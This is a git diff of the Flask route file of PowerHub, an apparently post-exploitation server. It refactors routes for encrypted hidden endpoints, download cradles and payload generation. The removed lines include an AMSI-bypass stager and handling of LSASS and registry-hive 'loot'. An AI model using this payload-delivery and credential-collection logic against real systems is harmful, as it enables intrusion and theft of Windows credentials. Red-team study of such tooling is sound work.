@@ -1,40 +1,70 @@
-from base64 import b64encode
-from binascii import unhexlify
+from base64 import urlsafe_b64decode
+import binascii
 from datetime import datetime
+from functools import wraps
 import logging
 import os
 import shutil
 from tempfile import TemporaryDirectory
 
+import flask.cli
 from flask import Blueprint, render_template, request, Response, redirect, \
-         send_from_directory, flash, abort, jsonify, make_response
+         send_from_directory, flash, abort, make_response
 
-from werkzeug.exceptions import BadRequestKeyError
-
-from powerhub.env import powerhub_app as ph_app
-
-from powerhub.sql import decrypt_hive, get_loot, \
-        delete_loot, get_clip_entry_list
-from powerhub.stager import modules, build_cradle, callback_urls, \
-        import_modules, webdav_url
+from powerhub.sql import get_clip_entry_list
+from powerhub.stager import build_cradle
+import powerhub.modules as phmod
 from powerhub.upload import save_file, get_filelist
-from powerhub.directories import UPLOAD_DIR, XDG_DATA_HOME, STATIC_DIR
+from powerhub.directories import directories
 from powerhub.payloads import create_payload
-from powerhub.tools import encrypt_rc4, encrypt_aes, compress
-from powerhub.auth import requires_auth
+from powerhub.tools import decrypt_aes
 from powerhub.repos import repositories, install_repo
-from powerhub.obfuscation import symbol_name
-from powerhub.loot import save_loot, get_lsass_goodies, get_hive_goodies, \
-        parse_sysinfo
-from powerhub.logging import log
-from powerhub._version import __version__
+from powerhub.hiddenapp import hidden_app
+from powerhub.dhkex import DH_ENDPOINT, dh_kex
+from powerhub.parameters import param_collection
 
+
+# Disable startup banner
+flask.cli.show_server_banner = lambda *args: None
 
 app = Blueprint('app', __name__)
+log = logging.getLogger(__name__)
 
-if not ph_app.args.DEBUG:
+if log.getEffectiveLevel() <= logging.DEBUG:
     logging.getLogger("socketio").setLevel(logging.WARN)
     logging.getLogger("engineio").setLevel(logging.WARN)
+
+
+def check_auth(username, password):
+    """This function is called to check if a username /
+    password combination is valid.
+    """
+    if app.args.AUTH:
+        if ':' in app.args.AUTH:
+            user, pwd = app.args.AUTH.split(':')[:2]
+        else:
+            user, pwd = app.args.AUTH, ''
+        return username == user and password == pwd
+    else:
+        return True
+
+
+def authenticate():
+    """Sends a 401 response that enables basic auth"""
+    return Response('Could not verify your access level for that URL.\n'
+                    'You have to login with proper credentials',
+                    401,
+                    {'WWW-Authenticate': 'Basic realm="Login Required"'})
+
+
+def requires_auth(f):
+    @wraps(f)
+    def decorated(*largs, **kwargs):
+        auth = request.authorization
+        if app.args.AUTH and (not auth or not check_auth(auth.username, auth.password)):
+            return authenticate()
+        return f(*largs, **kwargs)
+    return decorated
 
 
 def push_notification(msg):
@@ -43,123 +73,152 @@ def push_notification(msg):
     :msg: A dict either with keys [title, subtitle, body, category] or
     [action, location]
     """
-    # TODO make msg an object
-    ph_app.socketio.emit('push',
-                         msg,
-                         namespace="/push-notifications")
+    app.socketio.emit(
+        'push',
+        msg,
+        namespace="/push-notifications",
+    )
 
 
-@app.add_app_template_filter
-def debug(msg):
-    """This is a function for debugging statements in jinja2 templates"""
-    if ph_app.args.DEBUG:
-        return msg
-    return ""
+@app.route('/css/<path:path>')
+def send_css(path):
+    return send_from_directory(os.path.join('static', 'css'), path)
 
 
-@app.add_app_template_filter
-def nodebug(msg):
-    """This is a function for (no) debugging statements in jinja2 templates"""
-    if not ph_app.args.DEBUG:
-        return msg
-    return ""
+@app.route('/js/<path:path>')
+def send_js(path):
+    return send_from_directory(os.path.join('static', 'js'), path)
 
 
-@app.add_app_template_filter
-def rc4encrypt(msg):
-    """This is a function for encrypting strings in jinja2 templates"""
-    return b64encode(encrypt_rc4(msg.encode(), ph_app.key)).decode()
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>', methods=['POST', 'GET'])
+def catch_all(path):
+    # Check if requests comes from a browser
+    if not path:
+        if 'text/html' in request.headers.get('Accept', ''):
+            # Probably from Browser
+            return redirect("/hub")
+        else:
+            # Probably from PowerShell
+            return hidden_app.test_client().get('/')
+
+    if path.startswith(DH_ENDPOINT):
+        try:
+            public_key = int(path.split('/')[1])
+        except (IndexError, ValueError):
+            abort(404)
+        response = ' '.join(dh_kex(public_key, app.key))
+        return Response(response, content_type='text/plain; charset=utf-8')
+
+    # Return hidden endpoint
+    try:
+        # If path is of the form `<b64 string>/<n>`, then separate the `n`
+        # That's the increment for incremental delivery
+        if '/' in path:
+            path, increment = path.split('/')[:2]
+        else:
+            increment = None
+        path = urlsafe_b64decode(path)
+        path = decrypt_aes(path, app.key).decode()
+        if increment:
+            path += '&increment=%s' % increment
+        log.info("Forwarding hidden endpoint: %s" % path)
+        return hidden_app.test_client().get('/'+path)
+    except (binascii.Error, ValueError):
+        abort(404)
 
 
-@app.add_app_template_filter
-def rc4byteencrypt(data):
-    """This is a function for encrypting bytes in jinja2 templates
-
-    data must be hexascii encoded.
-    """
-    encrypted = encrypt_rc4(b64encode(unhexlify(data)), ph_app.key)
-    return b64encode(encrypted).decode()
-
-
-@app.route('/')
-@requires_auth
-def index():
-    return redirect('/hub')
+# === Tab: Hub ==============================================
 
 
 @app.route('/hub')
 @requires_auth
 def hub():
-    clip_entries = get_clip_entry_list(ph_app.clipboard)
-    context = {
-        "modules": modules,
-        "clip_entries": clip_entries,
-        "repositories": list(repositories.keys()),
-        "SSL": ph_app.args.SSL_KEY is not None,
-        "AUTH": ph_app.args.AUTH,
-        "VERSION": __version__,
-    }
-    return render_template("hub.html", **context)
+    clip_entries = [('-1', 'None')] + get_clip_entry_list(app.clipboard)
+    param_collection.update_options('clip-exec', clip_entries)
+    return render_template("html/hub.html", parameters=param_collection.parameters)
 
 
-@app.route('/loot')
+@app.route('/dlcradle')
 @requires_auth
-def loot_tab():
-    # turn sqlalchemy object 'lootbox' into dict/array
-    lootbox = get_loot()
-    loot = [{
-        "nonpersistent": ph_app.db is None,
-        "id": lb.id,
-        "lsass": get_lsass_goodies(lb.lsass),
-        "lsass_full": lb.lsass,
-        "hive": get_hive_goodies(lb.hive),
-        "hive_full": lb.hive,
-        "sysinfo": parse_sysinfo(lb.sysinfo,)
-    } for lb in lootbox]
+def dlcradle():
+    """Return the download cradle as HTML fragment"""
+    param_collection.parse_get_args(request.args)
+    params = param_collection
+
+    if params['launcher'] in [
+        'powershell',
+        'cmd',
+        'cmd_enc',
+        'bash',
+    ]:
+        cmd = build_cradle(params, app.key, app.callback_urls)
+        href = None
+    else:
+        # Return a download button for payload
+        import urllib
+        href = urllib.parse.urlencode(request.args)
+        href = '/dl?' + href
+        cmd = None
+
+    return render_template(
+        "html/hub/download-cradle.html",
+        dl_str=cmd,
+        href=href,
+    )
+
+
+@app.route('/dl')
+@requires_auth
+def download_cradle():
+    """Download payload as a file cradle"""
+    try:
+        param_collection.parse_get_args_short(request.args)
+        filename, binary = create_payload(param_collection, app.key, app.callback_urls)
+        response = make_response(binary)
+
+        response.headers.set('Content-Type', 'application/octet-stream')
+        response.headers.set(
+            'Content-Disposition',
+            'attachment',
+            filename=filename,
+        )
+        return response
+    except Exception as e:
+        msg = {
+            'title': 'An error occurred',
+            'body': str(e),
+            'category': 'danger',
+        }
+        flash(msg)
+        log.exception(e)
+        return redirect('/hub')
+
+
+# === Tab: Modules ==============================================
+
+
+@app.route('/modules')
+@requires_auth
+def modules():
     context = {
-        "loot": loot,
-        "AUTH": ph_app.args.AUTH,
-        "VERSION": __version__,
+        "modules": phmod.modules,
+        "repositories": list(repositories.keys()),
     }
-    return render_template("loot.html", **context)
+    return render_template("html/modules.html", **context)
+
+
+# === Tab: Clipboard ==============================================
 
 
 @app.route('/clipboard')
 @requires_auth
 def clipboard():
+    entries = list(app.clipboard.entries.values())
     context = {
-        "nonpersistent": ph_app.db is None,
-        "clipboard": list(ph_app.clipboard.entries.values()),
-        "AUTH": ph_app.args.AUTH,
-        "VERSION": __version__,
+        "clipboard": entries,
     }
-    return render_template("clipboard.html", **context)
-
-
-@app.route('/fileexchange')
-@requires_auth
-def fileexchange():
-    context = {
-        "files": get_filelist(),
-        "AUTH": ph_app.args.AUTH,
-        "VERSION": __version__,
-    }
-    return render_template("fileexchange.html", **context)
-
-
-@app.route('/css/<path:path>')
-def send_css(path):
-    return send_from_directory('static/css', path)
-
-
-@app.route('/js/<path:path>')
-def send_js(path):
-    return send_from_directory('static/js', path)
-
-
-@app.route('/img/<path:path>')
-def send_img(path):
-    return send_from_directory('static/img', path)
+    return render_template("html/clipboard.html", **context)
 
 
 @app.route('/clipboard/add', methods=["POST"])
@@ -167,7 +226,7 @@ def send_img(path):
 def add_clipboard():
     """Add a clipboard entry"""
     content = request.form.get("content")
-    ph_app.clipboard.add(
+    app.clipboard.add(
         content,
         str(datetime.utcnow()).split('.')[0],
         request.remote_addr
@@ -181,7 +240,17 @@ def add_clipboard():
 def del_clipboard():
     """Delete a clipboard entry"""
     id = int(request.form.get("id"))
-    ph_app.clipboard.delete(id)
+    app.clipboard.delete(id)
+    return ""
+
+
+@app.route('/clipboard/executable', methods=["POST"])
+@requires_auth
+def executable_clipboard():
+    """Set executable flag of a clipboard entry"""
+    id = int(request.form.get("id"))
+    value = (request.form.get("value") == 'true')
+    app.clipboard.set_executable(id, value)
     return ""
 
 
@@ -191,7 +260,7 @@ def edit_clipboard():
     """Edit a clipboard entry"""
     id = int(request.form.get("id"))
     content = request.form.get("content")
-    ph_app.clipboard.edit(id, content)
+    app.clipboard.edit(id, content)
     return ""
 
 
@@ -199,8 +268,8 @@ def edit_clipboard():
 @requires_auth
 def del_all_clipboard():
     """Delete all clipboard entries"""
-    for id in list(ph_app.clipboard.entries.keys()):
-        ph_app.clipboard.delete(id)
+    for id in list(app.clipboard.entries.keys()):
+        app.clipboard.delete(id)
     return redirect("/clipboard")
 
 
@@ -209,202 +278,50 @@ def del_all_clipboard():
 def export_clipboard():
     """Export all clipboard entries"""
     result = ""
-    for e in list(ph_app.clipboard.entries.values()):
+    for e in list(app.clipboard.entries.values()):
         headline = "%s (%s)\r\n" % (e.time, e.IP)
         result += headline
         result += "="*(len(headline)-2) + "\r\n"
         result += e.content + "\r\n"*2
-    return Response(
-        result,
-        content_type='text/plain; charset=utf-8'
-    )
-
-
-@app.route('/loot/export', methods=["GET"])
-@requires_auth
-def export_loot():
-    """Export all loot entries"""
-    lootbox = get_loot()
-    loot = [{
-        "id": lb.id,
-        "lsass": get_lsass_goodies(lb.lsass),
-        "hive": get_hive_goodies(lb.hive),
-        "sysinfo": parse_sysinfo(lb.sysinfo,)
-    } for lb in lootbox]
-    return jsonify(loot)
-
-
-@app.route('/loot/del-all', methods=["POST"])
-@requires_auth
-def del_all_loog():
-    """Delete all loot entries"""
-    # TODO get confirmation by user
-    delete_loot()
-    return redirect("/loot")
-
-
-@app.route('/m')
-def payload_m():
-    """Load a single module"""
-    if 'm' not in request.args:
-        return Response('error')
-    n = int(request.args.get('m'))
-    if n < len(modules):
-        modules[n].activate()
-        code = modules[n].code
-        if 'c' in request.args:
-            encrypted = encrypt_aes(compress(code), ph_app.key)
-            resp = b64encode(encrypted),
-        else:
-            resp = b64encode(encrypt_aes(code, ph_app.key)),
-        return Response(
-            resp,
-            content_type='text/plain; charset=utf-8'
-        )
-    else:
-        return Response("not found")
-
-
-@app.route('/0')
-def payload_0():
-    """Load 0th stage"""
-
-    try:
-        clipboard_id = int(request.args.get('c'))
-        exec_clipboard_entry = ph_app.clipboard. \
-            entries[clipboard_id].content
-    except TypeError:
-        exec_clipboard_entry = ""
-    amsi_bypass = request.args.get('a', 'none')
-    amsi_template = ""
-
-    try:
-        with open(os.path.join(XDG_DATA_HOME, "profile.ps1"), "r") as f:
-            profile = f.read()
-    except Exception:
-        profile = ""
-
-    # prevent path traversal
-    if not (amsi_bypass == 'none'
-            or '.' in amsi_bypass
-            or '/' in amsi_bypass
-            or '\\' in amsi_bypass):
-        amsi_template = "powershell/amsi/"+amsi_bypass+".ps1"
-
-    context = {
-        "modules": modules,
-        "profile": profile,
-        "callback_url": callback_urls.get(request.args.get('t')),
-        "transport": request.args.get('t'),
-        "webdav_url": webdav_url,
-        "key": ph_app.key,
-        "amsibypass": amsi_template,
-        "symbol_name": symbol_name,
-        "exec_clipboard_entry": exec_clipboard_entry,
-        "VERSION": __version__,
-    }
-    result = render_template(
-                    "powershell/stager.ps1",
-                    **context,
-                    content_type='text/plain'
-    )
-    return result
-
-
-@app.route('/ml')
-def hub_modules():
-    """Return list of hub modules"""
-    global modules
-    modules = import_modules()
-    context = {
-        "modules": modules,
-    }
-    result = render_template(
-                    "powershell/modules.ps1",
-                    **context,
-    ).encode()
-    result = b64encode(encrypt_aes((result), ph_app.key))
     return Response(result, content_type='text/plain; charset=utf-8')
 
 
-@app.route('/dlcradle')
-def dlcradle():
-    try:
-        if request.args['Launcher'] in [
-            'powershell',
-            'cmd',
-            'cmd_enc',
-            'bash',
-        ]:
-            cmd = build_cradle(request.args)
-            return render_template(
-                "hub/download-cradle.html",
-                dl_str=cmd,
-            )
-        else:
-            import urllib
-            href = urllib.parse.urlencode(request.args)
-            return render_template(
-                "hub/download-cradle.html",
-                dl_str=None,
-                href='/dl?' + href,
-            )
-
-    except BadRequestKeyError as e:
-        log.error("Unknown key, must be one of %s" %
-                  str(list(request.args.keys())))
-        return (str(e), 500)
+# === Tab: File Exchange ==============================================
 
 
-def process_file(file, loot_id, is_from_script, remote_addr):
-    """Save the file or the loot and return a message for push notification"""
-    if loot_id:
-        log.info("Loot received - %s" % loot_id)
-        try:
-            save_loot(file, loot_id, encrypted=is_from_script)
-            decrypt_hive(loot_id)
-            msg = {
-                'title': "Loot received!",
-                'body': "%s from %s has been stored." % (
-                    file.filename,
-                    remote_addr,
-                ),
-                'category': "success",
-            }
-        except Exception as e:
-            msg = {
-                'title': "Error while processing loot",
-                'body': str(e),
-                'category': "danger",
-            }
-            log.exception(e)
-    else:
-        log.info("File received - %s" % file.filename)
-        save_file(file, encrypted=is_from_script)
-        msg = {}
+@app.route('/fileexchange')
+@requires_auth
+def fileexchange():
+    context = {
+        "files": get_filelist(),
+    }
+    return render_template("html/fileexchange.html", **context)
+
+
+def process_file(file, is_from_script, remote_addr):
+    """Save the file and return a message for push notification"""
+    log.info("File received from %s: %s" % (remote_addr, file.filename))
+    key = None
+    if is_from_script:
+        key = app.key
+    save_file(file, key=key)
+    msg = {}
     return msg
 
 
-@app.route('/u', methods=["POST"])
+@app.route('/upload', methods=["POST"])
 def upload():
     """Upload one or more files"""
     file_list = request.files.getlist("file[]")
     is_from_script = "script" in request.args
-    if "loot" in request.args:
-        loot_id = request.args["loot"]
-    else:
-        loot_id = None
     remote_addr = request.remote_addr
     msg = {}
     for file in file_list:
         if file.filename == '':
             return redirect(request.url)
         if file:
-            msg = process_file(file, loot_id, is_from_script, remote_addr)
-    if loot_id:
-        push_notification({'action': 'reload', 'location': 'loot'})
-    else:
-        push_notification({'action': 'reload', 'location': 'fileexchange'})
+            msg = process_file(file, is_from_script, remote_addr)
+    push_notification({'action': 'reload', 'location': 'fileexchange'})
     if is_from_script:
         if msg:
             push_notification(msg)
@@ -419,7 +336,7 @@ def download_file(filename):
     """Download a file"""
     try:
         return send_from_directory(
-            UPLOAD_DIR,
+            directories.UPLOAD_DIR,
             filename,
             as_attachment='dl' in request.args,
         )
@@ -436,10 +353,13 @@ def download_all():
                 datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
     shutil.make_archive(os.path.join(tmp_dir.name, file_name),
                         "zip",
-                        UPLOAD_DIR)
+                        directories.UPLOAD_DIR)
     return send_from_directory(tmp_dir.name,
                                file_name + ".zip",
                                as_attachment=True)
+
+
+# === Tab: Modules =================================================
 
 
 @app.route('/getrepo', methods=["POST"])
@@ -464,30 +384,10 @@ def get_repo():
             'category': 'danger',
         }
     flash(msg, '')
-    return redirect('/hub')
+    return redirect('/modules')
 
 
-@app.route('/reload', methods=["POST"])
-@requires_auth
-def reload_modules():
-    """Reload all modules from disk"""
-    try:
-        global modules
-        modules = import_modules()
-        msg = {
-            'title': "Success",
-            'body': "Modules reloaded (press F5 to see them)",
-            'category': 'success',
-        }
-    except Exception as e:
-        msg = {
-            'title': "An error occured",
-            'body': str(e),
-            'category': 'danger',
-        }
-        log.exception(e)
-    flash(msg)
-    return ('OK', 200)
+# === Tab: Static =================================================
 
 
 @app.route('/list-static')
@@ -510,42 +410,16 @@ def list_static():
         directory['subdirs'].sort(key=lambda x: x['name'])
         return directory
     context = {
-        'rootdir': get_dir(STATIC_DIR)
+        'rootdir': get_dir(directories.STATIC_DIR)
     }
-    return render_template('list-static.html', **context)
+    return render_template('html/list-static.html', **context)
 
 
 @app.route('/static/<path:filename>')
 def server_static(filename):
     try:
-        return send_from_directory(STATIC_DIR,
+        return send_from_directory(directories.STATIC_DIR,
                                    filename,
                                    as_attachment=False)
     except PermissionError:
         abort(403)
-
-
-@app.route('/dl')
-@requires_auth
-def download_cradle():
-    """Download payload as a file cradle"""
-    try:
-        filename, binary = create_payload(request.args)
-        response = make_response(binary)
-
-        response.headers.set('Content-Type', 'application/octet-stream')
-        response.headers.set(
-            'Content-Disposition',
-            'attachment',
-            filename=filename,
-        )
-        return response
-    except Exception as e:
-        msg = {
-            'title': 'An error occurred',
-            'body': str(e),
-            'category': 'danger',
-        }
-        flash(msg)
-        log.exception(e)
-        return redirect('/hub')
